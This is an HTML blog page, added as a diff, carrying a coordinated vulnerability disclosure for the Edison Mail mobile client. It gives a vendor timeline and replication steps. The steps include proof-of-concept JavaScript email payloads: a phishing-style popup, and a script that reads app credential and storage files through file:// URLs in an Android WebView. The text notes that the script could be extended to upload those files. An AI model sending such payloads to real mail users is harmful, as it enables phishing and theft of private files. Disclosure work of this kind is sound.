@@ -1,0 +1,124 @@
+<!DOCTYPE html><html lang="en-us"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Edison Mail Disclosure</title><meta name="description" content="The Carve Systems team coordinates its disclosure with vendors when at all possible. This advisory is for Edison Mail Client version: Carve Systems consultants found&hellip;"><meta name="generator" content="Publii Open-Source CMS for Static Site"><script type="text/javascript" async src="https://www.googletagmanager.com/gtag/js?id=G-DBS1YCNH9G"></script><script type="text/javascript">window.dataLayer = window.dataLayer || [];
+				  function gtag(){dataLayer.push(arguments);}
+				  gtag('js', new Date());
+				  gtag('config', 'G-DBS1YCNH9G' , { 'anonymize_ip': true });</script><link rel="canonical" href="https://sotoventura.com/edison-mail-disclosure.html"><link rel="alternate" type="application/atom+xml" href="https://sotoventura.com/feed.xml"><link rel="alternate" type="application/json" href="https://sotoventura.com/feed.json"><meta property="og:title" content="Edison Mail Disclosure"><meta property="og:image" content="https://sotoventura.com/media/posts/8/disclosure.jpg"><meta property="og:site_name" content="Home"><meta property="og:description" content="The Carve Systems team coordinates its disclosure with vendors when at all possible. This advisory is for Edison Mail Client version: Carve Systems consultants found&hellip;"><meta property="og:url" content="https://sotoventura.com/edison-mail-disclosure.html"><meta property="og:type" content="article"><meta name="twitter:card" content="summary"><meta name="twitter:site" content="@almostjson"><meta name="twitter:title" content="Edison Mail Disclosure"><meta name="twitter:description" content="The Carve Systems team coordinates its disclosure with vendors when at all possible. This advisory is for Edison Mail Client version: Carve Systems consultants found&hellip;"><meta name="twitter:image" content="https://sotoventura.com/media/posts/8/disclosure.jpg"><link rel="stylesheet" href="assets/css/glitche-basic.css"><link rel="stylesheet" href="assets/css/glitche-layout.css"><link rel="stylesheet" href="assets/css/ionicons.css"><link rel="stylesheet" href="assets/css/magnific-popup.css"><link rel="stylesheet" href="assets/css/animate.css"><link rel="stylesheet" href="assets/css/default.css"><link href="https://fonts.googleapis.com/css?family=Roboto+Mono:400,100,300italic,300,100italic,400italic,500,500italic,700,700italic&amp;subset=latin,cyrillic" rel="stylesheet"><script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://sotoventura.com/edison-mail-disclosure.html"},"headline":"Edison Mail Disclosure","datePublished":"2019-08-25T00:00","dateModified":"2022-07-21T00:30","image":{"@type":"ImageObject","url":"https://sotoventura.com/media/posts/8/disclosure.jpg","height":5120,"width":5120},"description":"The Carve Systems team coordinates its disclosure with vendors when at all possible. This advisory is for Edison Mail Client version: Carve Systems consultants found&hellip;","author":{"@type":"Person","name":"Jesson","url":"https://sotoventura.com/authors/test/"},"publisher":{"@type":"Organization","name":"Jesson"}}</script></head><body><div class="preloader"><div class="centrize full-width"><div class="vertical-center"><div class="pre-inner"><div class="load typing-load"><p>loading...</p></div><span class="typed-load"></span></div></div></div></div><header><div class="head-top"><a href="#" class="menu-btn"><span></span></a><div class="top-menu"><ul><li><a href="https://sotoventura.com/" class="lnk">Home</a></li><li><a href="https://sotoventura.com/blogs.html" class="lnk">Blogs</a></li><li><a href="https://sotoventura.com/whoami.html" class="lnk">Whoami</a></li></ul></div></div></header><main><div class="section started"><div class="centrize full-width"><div class="vertical-center"><div class="started-content"><div class="h-title blog_title">Edison Mail Disclosure</div><div>August 25th 2019</div></div></div></div></div><div class="section blog"><div class="content"><div class="single-post-text"></div><div class="wrapper"><div class="section blog"><div class="content"><div class="single-post-text"><p>The Carve Systems team coordinates its disclosure with vendors when at all possible. This advisory is for Edison Mail Client version:</p><ul><li>Android - 1.6.1</li><li>iOS - 1.9.16</li></ul><p>Carve Systems consultants found that the Edison Mail Client on both iOS and Android would execute arbitrary JavaScript stored inside of HTML emails. Furthermore, consultants also found that it was possible to leverage this functionality to read and upload files off of a user's Android device and onto other - additional details can be found in the <a href="https://sotoventura.com/abusing-webviews-to-steal-files-via-email.html">Abusing WebViews to Steal Files via Email</a> blog.</p><h2 id="disclosuretimeline">Disclosure Timeline</h2><ul><li>3/20/19 - Initial Contact sent via vendor's contact page</li><li>3/27/19 - Vendor replies to Carve Systems team asking for details.</li><li>3/28/19 - Carve Systems shares initial advisory contents with Vendor.</li><li>3/29/19 - Vendor indicates that the issue will be resolved in the next release towards the end of April or early May.</li><li>6/3/19 - Carve Systems contacts vendor asking when fix will be implemented. Carve Systems is told that the iOS version has been fixed, but the android version has not.</li><li>6/4/19 - Carve Systems works with vendor to delay public posting for 30 days</li><li>6/17/19 - Vendor contacts Carve Systems stating that the issue has been resolved on Android.</li></ul><h2 id="advisorycontents">Advisory Contents</h2><p>Details about these findings were shared with Edison mail on March 28, 2019.</p><p>The slightly modified version of the initial email is shared below:</p><pre><code class="markdown hljs">
+<span class="hljs-section">## Versions Tested:</span>
+<span class="hljs-bullet">
+- </span>Android version 1.6.1 (92)
+<span class="hljs-bullet">- </span>iOS 1.9.16 (828)
+
+<span class="hljs-section">## Details</span>
+
+The Edison mail mobile client executes any JavaScript contained within the body of 
+an email containing HTML content. This code execution vulnerability can be triggered 
+with minimal user interaction. On iOS, the vulnerability requires that a user reply or 
+forward the email - on occasions simply opening the email also triggers the payload; 
+this is unreliable. However, Android will execute the remote code anytime the email body 
+is rendered, as such opening an email, replying to an email, or forwarding an email 
+will execute the code.
+
+As an example consider the following HTML email:
+
+<span class="hljs-code">```
+EMAIL BODY
+
+&lt;script&gt;
+  alert("Edison Mail has detected your phone is out of storage, 
+    please visit http://fakesite.com to get more storage");
+&lt;/script&gt;
+
+```</span>
+
+This email will create a normal looking email, but once the script tag's code has 
+been executed a popup will appear. Although benign, the above could be used to 
+craft a convincing phishing campaign. For a more malicious example, see the 
+following issue.
+
+<span class="hljs-section">## Replication Steps:</span>
+<span class="hljs-bullet">
+1. </span>Using a service that allows sending of HTML emails, such as <span class="hljs-code">`https://putsmail.com/tests/new`</span>, send the following example to an iOS or Android device using Edison Mail.
+
+<span class="hljs-code">```
+EMAIL BODY
+  &lt;script&gt;
+    alert("Edison Mail has detected your phone is out of storage, please visit http://fakesite.com to get more storage");
+  &lt;/script&gt;
+
+```</span>
+<span class="hljs-bullet">
+2. </span>On Android simply opening the email should trigger a pop up. On iOS open the 
+email and attempt to reply or forward the email to trigger the popup.
+
+<span class="hljs-section"># Remote code execution can be leveraged to remotely read contents off a user's </span>
+devices.
+
+<span class="hljs-section">## Versions Tested</span>
+<span class="hljs-bullet">
+- </span>Android version 1.6.1 (92)
+
+<span class="hljs-section">## Details</span>
+
+The remote code execution vulnerability discussed above is executed within a WebView 
+on Android. This WebView uses overly permissive settings, which allow an attacker 
+to not only execute code within the WebView, but also read the contents of files 
+on the device. As the WebView is running under the Edison mail application, 
+it has access to both files stored on the user's external storage as well as 
+the application's internal storage.
+
+As an example consider the following:
+
+<span class="hljs-code">```
+EMAIL BODY
+&lt;script&gt;
+  function alertFile(filepath){
+    var fileRequest = new XMLHttpRequest();
+    fileRequest.onreadystatechange = function(){
+      alert(this.responseText);
+    }
+    fileRequest.open("GET", filepath, false);
+    fileRequest.send();
+  }
+  alertFile("file:///data/data/com.easilydo.mail/shared_prefs/EdoChatAccount.xml");
+  alertFile("file:///sdcard/test.txt");
+&lt;/script&gt;
+
+```</span>
+
+<span class="hljs-strong">**Note:**</span> In order to have this example completely function, a file on the SD card with 
+the name <span class="hljs-code">`test.txt`</span> must first be created.
+
+
+The above example will only read and display the contents of the file to the user, however 
+it is would be possible to modify the above code snippet to not only read the file's content,
+but to also upload the file's content to remote server. Additionally, in order for a user to 
+retrieve files from a user's device they must know the file path ahead of time. However, multiple 
+files with known static paths exist. For example, if the <span class="hljs-code">`data/data/com.easilydo.mail/files/Email.realm`</span> 
+file is read and upload, an attacker could get a copy of all cached emails sent from/to the user.
+
+
+<span class="hljs-section">## Replication Steps:</span>
+<span class="hljs-bullet">
+1. </span>Using a service that allows sending of HTML emails, such as <span class="hljs-code">`https://putsmail.com/tests/new`</span>, send 
+the following example to an iOS or Android device using Edison Mail.
+
+<span class="hljs-code">```
+EMAIL BODY
+  &lt;script&gt;
+    function alertFile(filepath){
+      var fileRequest = new XMLHttpRequest();
+      fileRequest.onreadystatechange = function(){
+        alert(this.responseText);
+      }
+      fileRequest.open("GET", filepath, false);
+      fileRequest.send();
+    }
+    alertFile("file:///data/data/com.easilydo.mail/shared_prefs/EdoChatAccount.xml");
+    alertFile("file:///sdcard/test.txt");
+  &lt;/script&gt;
+
+```</span>
+<span class="hljs-bullet">
+2. </span>On Android simply opening the email should trigger various popups. The first one may be blank.
+<span class="hljs-bullet">3. </span>Hitting OK, should show the contents of the <span class="hljs-code">`EdoChatAccount.xml`</span> file.
+<span class="hljs-bullet">4. </span>If present, hitting OK should show the contents of the <span class="hljs-code">`test.txt`</span> file.
+</code></pre></div><div class="clear"> </div></div></div></div></div></div></main><div class="line top"></div><div class="line bottom"></div><div class="line left"></div><div class="line right"></div><script src="assets/js/jquery.min.js"></script><script src="assets/js/jquery.validate.js"></script><script src="assets/js/typed.js"></script><script src="assets/js/magnific-popup.js"></script><script src="assets/js/masonry.pkgd.js"></script><script src="assets/js/imagesloaded.pkgd.js"></script><script src="assets/js/masonry-filter.js"></script><script src="assets/js/highlight.pack.js"></script><script src="assets/js/glitche-scripts.js"></script></body></html>
